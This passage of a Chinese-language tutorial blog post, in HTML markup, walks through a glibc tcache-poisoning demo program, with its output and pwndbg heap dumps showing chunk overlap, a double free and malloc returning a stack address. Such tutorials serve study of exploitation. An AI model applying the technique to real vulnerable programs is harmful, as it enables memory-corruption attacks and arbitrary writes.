class="hljs-built_in">malloc</span>(<span class="hljs-number">0x120</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);<br>    b[<span class="hljs-number">0x120</span>/<span class="hljs-number">8</span><span class="hljs-number">-2</span>] = (<span class="hljs-type">long</span>)stack_var;<br>    <br>    <span class="hljs-comment">// take target out</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we can cash out the target chunk.&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The new chunk is at %p\n&quot;</span>, c);<br>    <br>    <span class="hljs-comment">// sanity check</span><br>    <span class="hljs-built_in">assert</span>(c==stack_var);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got control on target/stack!\n\n&quot;</span>);<br>    <br>    <span class="hljs-comment">// note</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Note:&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);<br>    <span class="hljs-comment">//请注意,关于本技术还有一个非常完美的东西,如果我们可以再次free b,free victim,并且可以修改victim的fwd指针,一旦我们成功利用本技术,那么就意味着我们拥有了多次很简单的任意写的机会了</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="程序运行结果-1"><a href="#程序运行结果-1" class="headerlink" title="程序运行结果"></a>程序运行结果</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">This file demonstrates a powerful tcache poisoning attack <span class="hljs-keyword">by</span> tricking malloc <span class="hljs-keyword">into</span><br>returning a pointer <span class="hljs-keyword">to</span> an arbitrary location (<span class="hljs-keyword">in</span> this demo, the stack).<br>This attack only relies <span class="hljs-keyword">on</span> <span class="hljs-type">double</span> free.<br><br>The address we want malloc() <span class="hljs-keyword">to</span> <span class="hljs-keyword">return</span>, namely,<br>the target address <span class="hljs-built_in">is</span> <span class="hljs-number">0</span>x7fff07789970.<br><br>Preparing heap layout<br>Allocating <span class="hljs-number">7</span> chunks(malloc(<span class="hljs-number">0</span>x100)) <span class="hljs-keyword">for</span> us <span class="hljs-keyword">to</span> fill up tcache list later.<br>Allocating a chunk <span class="hljs-keyword">for</span> later consolidation<br>Allocating the victim chunk.<br>malloc(<span class="hljs-number">0</span>x100): a=<span class="hljs-number">0</span>x564e770f6ae0.<br>Allocating a padding <span class="hljs-keyword">to</span> prevent consolidation.<br><br>Now we are able <span class="hljs-keyword">to</span> cause chunk overlapping<br><span class="hljs-keyword">Step</span> <span class="hljs-number">1</span>: fill up tcache list<br><span class="hljs-keyword">Step</span> <span class="hljs-number">2</span>: free the victim chunk so it will be added <span class="hljs-keyword">to</span> unsorted bin<br><span class="hljs-keyword">Step</span> <span class="hljs-number">3</span>: free the previous chunk <span class="hljs-built_in">and</span> make it consolidate <span class="hljs-keyword">with</span> the victim chunk.<br><span class="hljs-keyword">Step</span> <span class="hljs-number">4</span>: add the victim chunk <span class="hljs-keyword">to</span> tcache list <span class="hljs-keyword">by</span> taking one out <span class="hljs-keyword">from</span> it <span class="hljs-built_in">and</span> free victim again<br><br>Launch tcache poisoning<br>Now the victim <span class="hljs-built_in">is</span> contained <span class="hljs-keyword">in</span> a larger freed chunk, we can <span class="hljs-keyword">do</span> a simple tcache poisoning <span class="hljs-keyword">by</span> <span class="hljs-keyword">using</span> overlapped chunk<br>We simply overwrite victim<span class="hljs-comment">&#x27;s fwd pointer</span><br>Now we can cash out the target chunk.<br>The <span class="hljs-built_in">new</span> chunk <span class="hljs-built_in">is</span> at <span class="hljs-number">0</span>x7fff07789970<br>Got control <span class="hljs-keyword">on</span> target/stack!<br><br><span class="hljs-symbol">Note:</span><br><span class="hljs-built_in">And</span> the wonderful thing about this exploitation <span class="hljs-built_in">is</span> that: you can free b, victim again <span class="hljs-built_in">and</span> modify the fwd pointer <span class="hljs-keyword">of</span> victim<br><span class="hljs-keyword">In</span> that <span class="hljs-keyword">case</span>, once you have done this exploitation, you can have many arbitary writes very easily.<br><br></code></pre></td></tr></table></figure><h2 id="关键代码调试-2"><a href="#关键代码调试-2" class="headerlink" title="关键代码调试"></a>关键代码调试</h2><p>下面我们就直接来调试吧,断点如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">31</span>     <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);<br>  <span class="hljs-number">32</span>     <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>  <span class="hljs-number">33</span>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-built_in">sizeof</span>(x)/<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++)&#123;<br>  <span class="hljs-number">34</span>         x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-number">35</span>     &#125;<br>_ <span class="hljs-number">36</span>     <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a chunk for later consolidation&quot;</span>);<br><br>  <span class="hljs-number">37</span>     <span class="hljs-type">intptr_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-number">38</span>     <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating the victim chunk.&quot;</span>);<br>  <span class="hljs-number">39</span>     <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-number">40</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); <br>  <span class="hljs-number">41</span>     <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);<br>_ <span class="hljs-number">42</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>  <span class="hljs-number">47</span>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>  <span class="hljs-number">48</span>         <span class="hljs-built_in">free</span>(x[i]);<br>  <span class="hljs-number">49</span>     &#125;<br>_ <span class="hljs-number">50</span>     <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>可以看到我这里只下了三个断点,50行之后我们都单步来调试他,下面我们开始吧</p><p>首先是我们申请的heap</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; p/x x                                                                                                                                                                                                   <br>$<span class="hljs-number">2</span> = &#123;<span class="hljs-number">0</span>x5<span class="hljs-number">55555559260</span>, <span class="hljs-number">0</span>x5<span class="hljs-number">55555559370</span>, <span class="hljs-number">0</span>x5<span class="hljs-number">55555559480</span>, <span class="hljs-number">0</span>x5<span class="hljs-number">55555559590</span>, <span class="hljs-number">0</span>x55<span class="hljs-number">55555596a0</span>, <span class="hljs-number">0</span>x55<span class="hljs-number">55555597b0</span>, <span class="hljs-number">0</span>x55<span class="hljs-number">55555598c0</span>&#125;          <br></code></pre></td></tr></table></figure><p>然后是我们的chunk prev,a 还有用来防止合并的chunk</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">0x5555555599c0</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>,<br>  mchunk_size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x555555559ad0</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>,<br>  mchunk_size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x555555559be0</span> FASTBIN &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>,<br>  mchunk_size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x20401</span><br>&#125;<br></code></pre></td></tr></table></figure><p>到这里结束,就是我们对堆做的一个简答的构造布局了,下面开始我们的overlapping的构造</p><p>首先来填满我们的tcache-list</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x110 [  7]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x5555555598c0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0                                                                  </span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>因为我们0x110的tcache-list被填满了,因此这里我们再free a就会进入unsorted bin了</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x110 [  7]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x5555555598c0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x555555559ad0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x555555559ad0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>因为我们的prev和a是连在一起的chunk,因此此时我们再free prev就会触发和在unsorted bin中与a的合并,也就是</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; bins<br>tcachebins<br><span class="hljs-number">0</span>x110 [  <span class="hljs-number">7</span>]: <span class="hljs-number">0</span>x55<span class="hljs-number">55555598c0</span> __ <span class="hljs-number">0</span>x55<span class="hljs-number">55555597b0</span> __ <span class="hljs-number">0</span>x55<span class="hljs-number">55555596a0</span> __ <span class="hljs-number">0</span>x5<span class="hljs-number">55555559590</span> __ <span class="hljs-number">0</span>x5<span class="hljs-number">55555559480</span> __ <span class="hljs-number">0</span>x5<span class="hljs-number">55555559370</span> __ <span class="hljs-number">0</span>x5<span class="hljs-number">55555559260</span> __ <span class="hljs-number">0</span>x0<br>fastbins<br><span class="hljs-number">0</span>x20: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x30: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x40: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x50: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x60: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x70: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x80: <span class="hljs-number">0</span>x0<br>unsortedbin<br>all: <span class="hljs-number">0</span>x55<span class="hljs-number">55555599c0</span> __ <span class="hljs-number">0</span>x7ffff7fbcca0 (main_arena+<span class="hljs-number">96</span>) __ <span class="hljs-number">0</span>x55<span class="hljs-number">55555599c0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x55<span class="hljs-number">55555599c0</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555599c0</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000221</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555599d0</span>: <span class="hljs-number">0</span>x00007ffff7fbcca0      <span class="hljs-number">0</span>x00007ffff7fbcca0<br><span class="hljs-number">0</span>x55<span class="hljs-number">55555599e0</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x55<span class="hljs-number">55555599f0</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x5<span class="hljs-number">55555559a00</span>: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>可以看到,此时被合并后的大chunk仍在unsortedbin 中且大小为0x221</p><p>现在让我们从tcache list中取出一个chunk来留下一个位置</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; bins<br>tcachebins<br><span class="hljs-number">0</span>x110 [  <span class="hljs-number">6</span>]: <span class="hljs-number">0</span>x55<span class="hljs-number">55555597b0</span> __ <span class="hljs-number">0</span>x55<span class="hljs-number">55555596a0</span> __ <span class="hljs-number">0</span>x5<span class="hljs-number">55555559590</span> __ <span class="hljs-number">0</span>x5<span class="hljs-number">55555559480</span> __ <span class="hljs-number">0</span>x5<span class="hljs-number">55555559370</span> __ <span class="hljs-number">0</span>x5<span class="hljs-number">55555559260</span> __ <span class="hljs-number">0</span>x0<br></code></pre></td></tr></table></figure><p>现在我们再free一次a,为什么能成功呢?</p><p>因为我们的prev和a已经合并了,此时free list上并没有a的信息,因此我们可以再次free一次a</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x110 [  7]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x555555559ae0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x5555555599c0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x5555555599c0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>可以看到此时我们的a已经被链入free list中,属于tcache</p><p>现在我们的a既在tcache中,又在我们的unsorted bin的大chunk中</p><p>此时我们malloc b(0x120),系统就会从我们的unsorted bin中切出一块来给他,把剩下的留在unsorted bin中,也就意味着b会从之前prev的地方开始，并且和a有交集，也就是成功构造了overlapping</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x110 [  7]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x555555559ae0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x555555559af0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x555555559af0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>现在我们的unsorted bin中的chunk就是从0x555555559af0处开始的了</p><p>现在我们通过b来覆写a的fwd指针</p><p>我们先来看看我们现在a的结构</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">$<span class="hljs-number">20</span> = &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>x0, <br>  mchunk_size = <span class="hljs-number">0</span>x111, <br>  fd = <span class="hljs-number">0</span>x55<span class="hljs-number">55555597b0</span>, <br>  bk = <span class="hljs-number">0</span>x5<span class="hljs-number">55555559010</span>, <br>  fd_nextsize = <span class="hljs-number">0</span>x0, <br>  bk_nextsize = <span class="hljs-number">0</span>xf1<br>&#125;<br></code></pre></td></tr></table></figure><p>之后是覆写后a的结构</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$21</span> = &#123;</span><br>  mchunk_prev_size = <span class="hljs-number">0x0</span>,<br>  mchunk_size = <span class="hljs-number">0x111</span>,<br>  fd = <span class="hljs-number">0x7fffffffe570</span>,<br>  bk = <span class="hljs-number">0x555555559010</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0xf1</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到我们a的fd指针已经被更改了,此时我们的tcache链</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; bins<br>tcachebins<br><span class="hljs-number">0x110</span> [  <span class="hljs-number">7</span>]: <span class="hljs-number">0x555555559ae0</span> __ <span class="hljs-number">0x7fffffffe570</span> __ <span class="hljs-number">0xc2</span><br></code></pre></td></tr></table></figure><p>现在就可以看到结果了,我们先malloc一块出来</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x110 [  6]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x7fffffffe570 __ 0xc2</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x555555559af0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x555555559af0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>现在就只剩下我们想分配的内存了,下面我们把他分配出来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x c</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">22 = 0x7fffffffe570</span><br></code></pre></td></tr></table></figure><p>成功</p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>本例即是通过构造一个chunk_overlapping来辅助我们double free一个tcache chunk，从而得到任意地址分配的效果</p><p>首先程序先在栈上声明了一个变量</p><p>之后申请了7个大小为0x100的chunks来为后面填满tcache来做准备</p><p>然后申请了3个chunk ,prev(0x100),a(0x100)还有用于防止后面我们释放a时a和top chunk合并的一个chunk(0x10)</p><p>到此准备工作就结束了</p><p>下面程序free掉了之前我们申请的那7个chunk来填满我们的tcache</p><p>之后程序free掉了a，a被放入了unsorted bin中</p><p>此时我们在free prev，由于a,prev相邻，因此二者合并成了一个大chunk，同样被放进了unsorted bin中</p><p>此时free list上就没有了a的信息</p><p>现在程序从tcache中取出一个chunk,tcache中就有了一个空位，我们再次free a,就会把我们的a放到tcache中了</p><p>此时，我们的a既在tcache中，又在unsortedbin的大chunk中</p><p>也就是完成了一个double free</p><p>之后程序malloc了b(0x120),由于unsortedbin中的chunk大小大于0x120,因此做了一个切割，并把剩下的部分留在unsorted bin中</p><p>此时的b是从之前prev的位置开始的，因此我们通过覆写b来将我们a的fwd指针指向栈上</p><p>此时，我们再申请两次就可以分配到栈上的地址了</p><h1 id="完结"><a href="#完结" class="headerlink" 